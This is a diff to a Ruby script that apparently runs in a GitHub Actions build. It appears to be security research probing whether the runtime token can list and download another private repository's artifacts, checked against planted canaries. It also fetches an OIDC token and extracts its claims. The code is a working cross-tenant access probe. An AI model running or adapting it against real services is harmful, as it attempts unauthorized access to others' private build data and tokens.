@@ -16,6 +16,10 @@ CURRENT_CACHE_KEY = "GH-R56-CURRENT-PAGES-CACHE-487a2d91f6ce"
 CURRENT_CACHE_CANARY = "GH-R56-CURRENT-REPO-CACHE-CONTROL-487a2d91f6ce\n"
 FOREIGN_CACHE_KEY = "GH-R56-FOREIGN-PRIVATE-CACHE-9c3b65a80fd2"
 FOREIGN_CACHE_CANARY = "GH-R56-FOREIGN-PRIVATE-CACHE-CANARY-9c3b65a80fd2\n"
+FOREIGN_ARTIFACT_NAME = "GH-R56-FOREIGN-PRIVATE-ARTIFACT-6a27e84cd019"
+FOREIGN_ARTIFACT_CANARY = "GH-R56-FOREIGN-PRIVATE-ARTIFACT-CANARY-6a27e84cd019\n"
+FOREIGN_ARTIFACT_RUN_BACKEND_ID = "09a614b1-1670-4610-a9d8-f764192e92e6"
+FOREIGN_ARTIFACT_JOB_BACKEND_ID = "5a259c99-a5ae-553b-897d-64ef0a8a2281"
 
 def http_request(uri, request, body_limit: 131_072)
   response = Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == "https", open_timeout: 5, read_timeout: 15) do |http|
@@ -180,10 +184,197 @@ def sanitized_cache_result(response, expected_canary)
   }
 end
 
+def runtime_backend_ids(token)
+  encoded = token.split(".").fetch(1)
+  encoded += "=" * ((4 - encoded.length % 4) % 4)
+  payload = JSON.parse(Base64.urlsafe_decode64(encoded))
+  scope = payload.fetch("scp").split.find { |item| item.start_with?("Actions.Results:") }
+  _prefix, run_backend_id, job_backend_id = scope.split(":", 3)
+  [run_backend_id, job_backend_id]
+rescue StandardError
+  [nil, nil]
+end
+
+def artifact_twirp(method, body, token, base_url)
+  return { "status" => 0, "endpoint_present" => false, "parsed" => {} } if base_url.empty?
+
+  uri = URI.join(base_url, "/twirp/github.actions.results.api.v1.ArtifactService/#{method}")
+  request = Net::HTTP::Post.new(uri)
+  request["Authorization"] = "Bearer #{token}"
+  request["Content-Type"] = "application/json"
+  request["User-Agent"] = "@actions/artifact-owned-boundary-control"
+  request.body = JSON.generate(body)
+  response = http_request(uri, request)
+  parsed = JSON.parse(response["body"])
+  response.merge("endpoint_present" => true, "parsed" => parsed)
+rescue JSON::ParserError
+  response.merge("endpoint_present" => true, "parsed" => {})
+rescue StandardError => error
+  {
+    "status" => 0,
+    "endpoint_present" => true,
+    "parsed" => {},
+    "error_class" => error.class.name
+  }
+end
+
+def artifact_list(run_backend_id, job_backend_id, token, base_url)
+  artifact_twirp(
+    "ListArtifacts",
+    {
+      "workflow_run_backend_id" => run_backend_id,
+      "workflow_job_run_backend_id" => job_backend_id
+    },
+    token,
+    base_url
+  )
+end
+
+def artifact_signed_url(run_backend_id, job_backend_id, name, token, base_url)
+  artifact_twirp(
+    "GetSignedArtifactURL",
+    {
+      "workflow_run_backend_id" => run_backend_id,
+      "workflow_job_run_backend_id" => job_backend_id,
+      "name" => name
+    },
+    token,
+    base_url
+  )
+end
+
+def download_owned_zip(url, expected_canary)
+  return { "downloaded" => false, "canary_match" => false } if url.to_s.empty?
+
+  uri = URI(url)
+  redirects = 0
+  loop do
+    request = Net::HTTP::Get.new(uri)
+    response = http_request(uri, request, body_limit: 1_048_576)
+    if [301, 302, 303, 307, 308].include?(response["status"]) && redirects < 3
+      location = response["location"]
+      return { "downloaded" => false, "canary_match" => false, "status" => response["status"] } unless location
+      uri = URI.join(uri, location)
+      redirects += 1
+      next
+    end
+
+    return {
+      "downloaded" => false,
+      "canary_match" => false,
+      "status" => response["status"],
+      "request_id" => response["request_id"]
+    } unless response["status"] == 200
+
+    python = <<~'PYTHON'
+      import base64
+      import io
+      import os
+      import sys
+      import zipfile
+
+      expected = base64.b64decode(os.environ["EXPECTED_CANARY_B64"])
+      matched = False
+      with zipfile.ZipFile(io.BytesIO(sys.stdin.buffer.read())) as archive:
+          for name in archive.namelist():
+              if name.endswith("private-artifact-canary.txt"):
+                  matched = archive.read(name) == expected
+      print("1" if matched else "0")
+    PYTHON
+    stdout, _stderr, process = Open3.capture3(
+      { "EXPECTED_CANARY_B64" => Base64.strict_encode64(expected_canary) },
+      "python3",
+      "-c",
+      python,
+      stdin_data: response["body"]
+    )
+    return {
+      "downloaded" => true,
+      "canary_match" => process.success? && stdout.strip == "1",
+      "status" => response["status"],
+      "request_id" => response["request_id"],
+      "zip_parse_success" => process.success?
+    }
+  end
+rescue StandardError => error
+  {
+    "downloaded" => false,
+    "canary_match" => false,
+    "error_class" => error.class.name
+  }
+end
+
+def sanitized_artifact_list(response)
+  artifacts = response.fetch("parsed", {}).fetch("artifacts", [])
+  {
+    "endpoint_present" => response["endpoint_present"],
+    "status" => response["status"],
+    "request_id" => response["request_id"],
+    "artifact_count" => artifacts.length,
+    "artifact_names" => artifacts.map { |artifact| artifact["name"] },
+    "error_class" => response["error_class"]
+  }
+end
+
+def sanitized_artifact_signed(response, expected_canary = nil)
+  signed_url = response.fetch("parsed", {})["signed_url"]
+  download = expected_canary ? download_owned_zip(signed_url, expected_canary) : { "downloaded" => false }
+  {
+    "endpoint_present" => response["endpoint_present"],
+    "status" => response["status"],
+    "request_id" => response["request_id"],
+    "signed_url_present" => !signed_url.to_s.empty?,
+    "download" => download,
+    "error_class" => response["error_class"]
+  }
+end
+
+def oidc_claim_probe(request_url, request_token)
+  return { "endpoint_present" => false } if request_url.empty? || request_token.empty?
+
+  uri = URI(request_url)
+  params = URI.decode_www_form(uri.query.to_s).reject { |key, _value| key == "audience" }
+  params << ["audience", "gh-r49-owned-boundary-control"]
+  uri.query = URI.encode_www_form(params)
+  request = Net::HTTP::Get.new(uri)
+  request["Authorization"] = "Bearer #{request_token}"
+  request["User-Agent"] = "gh-r49-owned-oidc-control"
+  response = http_request(uri, request)
+  encoded_token = JSON.parse(response["body"])["value"]
+
+  claims = {}
+  unless encoded_token.to_s.empty?
+    encoded = encoded_token.split(".").fetch(1)
+    encoded += "=" * ((4 - encoded.length % 4) % 4)
+    decoded = JSON.parse(Base64.urlsafe_decode64(encoded))
+    %w[iss aud sub repository repository_owner actor ref job_workflow_ref environment].each do |key|
+      claims[key] = decoded[key] if decoded.key?(key)
+    end
+  end
+
+  {
+    "endpoint_present" => true,
+    "status" => response["status"],
+    "request_id" => response["request_id"],
+    "token_returned" => !encoded_token.to_s.empty?,
+    "selected_claims" => claims
+  }
+rescue StandardError => error
+  {
+    "endpoint_present" => true,
+    "status" => response ? response["status"] : 0,
+    "request_id" => response ? response["request_id"] : nil,
+    "token_returned" => false,
+    "error_class" => error.class.name
+  }
+end
+
 github_token = ENV.fetch("JEKYLL_GITHUB_TOKEN", "")
 runtime_token = ENV.fetch("ACTIONS_RUNTIME_TOKEN", "")
 cache_url = ENV.fetch("ACTIONS_CACHE_URL", "")
 results_url = ENV.fetch("ACTIONS_RESULTS_URL", "")
+oidc_request_url = ENV.fetch("ACTIONS_ID_TOKEN_REQUEST_URL", "")
+oidc_request_token = ENV.fetch("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
 
 current_api = github_get("/repos/#{CURRENT_REPO}/contents/README.md", github_token)
 foreign_api = github_get("/repos/#{FOREIGN_REPO}/contents/#{FOREIGN_PATH}", github_token)
@@ -192,6 +383,42 @@ if foreign_api["status"] == 200
   parsed = JSON.parse(foreign_api["body"])
   foreign_api_canary_match = Base64.decode64(parsed.fetch("content", "")) == EXPECTED_API_CANARY
 end
+
+artifact_results = {}
+unless runtime_token.empty?
+  current_run_backend_id, current_job_backend_id = runtime_backend_ids(runtime_token)
+  if current_run_backend_id && current_job_backend_id
+    current_list = artifact_list(current_run_backend_id, current_job_backend_id, runtime_token, results_url)
+    current_artifacts = current_list.fetch("parsed", {}).fetch("artifacts", [])
+    current_name = current_artifacts.first && current_artifacts.first["name"]
+    current_signed = if current_name
+                       artifact_signed_url(current_run_backend_id, current_job_backend_id, current_name, runtime_token, results_url)
+                     else
+                       { "status" => 0, "endpoint_present" => !results_url.empty?, "parsed" => {} }
+                     end
+    foreign_list = artifact_list(
+      FOREIGN_ARTIFACT_RUN_BACKEND_ID,
+      FOREIGN_ARTIFACT_JOB_BACKEND_ID,
+      runtime_token,
+      results_url
+    )
+    foreign_signed = artifact_signed_url(
+      FOREIGN_ARTIFACT_RUN_BACKEND_ID,
+      FOREIGN_ARTIFACT_JOB_BACKEND_ID,
+      FOREIGN_ARTIFACT_NAME,
+      runtime_token,
+      results_url
+    )
+    artifact_results = {
+      "current_run_control_list" => sanitized_artifact_list(current_list),
+      "current_run_control_signed_url" => sanitized_artifact_signed(current_signed),
+      "foreign_private_run_probe_list" => sanitized_artifact_list(foreign_list),
+      "foreign_private_run_probe_signed_url" => sanitized_artifact_signed(foreign_signed, FOREIGN_ARTIFACT_CANARY)
+    }
+  end
+end
+
+oidc_result = oidc_claim_probe(oidc_request_url, oidc_request_token)
 
 cache_results = {}
 unless runtime_token.empty?
@@ -208,7 +435,7 @@ unless runtime_token.empty?
 end
 
 result = {
-  "finding_id" => "GH-R49-ESCALATION-CACHE-BOUNDARY",
+  "finding_id" => "GH-R49-ESCALATION-SERVICE-BOUNDARIES",
   "repository" => ENV["GITHUB_REPOSITORY"],
   "actor" => ENV["GITHUB_ACTOR"],
   "euid" => Process.euid,
@@ -216,7 +443,7 @@ result = {
   "actions_runtime_token_present" => !runtime_token.empty?,
   "cache_url_present" => !cache_url.empty?,
   "results_url_present" => !results_url.empty?,
-  "id_token_request_url_present" => !ENV.fetch("ACTIONS_ID_TOKEN_REQUEST_URL", "").empty?,
+  "id_token_request_url_present" => !oidc_request_url.empty?,
   "current_repo_api_control" => {
     "status" => current_api["status"],
     "request_id" => current_api["request_id"]
@@ -229,7 +456,9 @@ result = {
     "canary_match" => foreign_api_canary_match,
     "error_class" => foreign_api["error_class"]
   },
-  "cache_service_probes" => cache_results
+  "cache_service_probes" => cache_results,
+  "artifact_service_probes" => artifact_results,
+  "oidc_claim_probe" => oidc_result
 }
 
 workspace = ENV.fetch("GITHUB_WORKSPACE", "/github/workspace")
